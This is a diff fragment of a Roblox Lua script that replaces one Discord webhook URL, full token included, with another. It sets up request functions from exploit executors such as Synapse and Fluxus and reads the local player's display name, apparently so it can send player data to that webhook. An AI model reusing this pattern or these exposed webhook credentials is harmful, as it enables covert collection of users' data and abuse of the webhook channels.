@@ -3,7 +3,7 @@ local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 
-local webhookURL = "https://discord.com/api/webhooks/1384234290531012688/xNtbMFCMQjOFLOQlnzdywttNDd0JLorbayEwuuXiNxiXau9Ey7PFAr52yPvlrS1UO0Qh"
+local webhookURL = "https://discord.com/api/webhooks/1387224455851282513/-t9Iw-BUuJ2C1EMeGPBy-L1Xfn8-OKLPJ4GStG4kTRGnwRJEYgrLrFsml1axYrQABGoX"
 local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
 local displayName = player.DisplayName
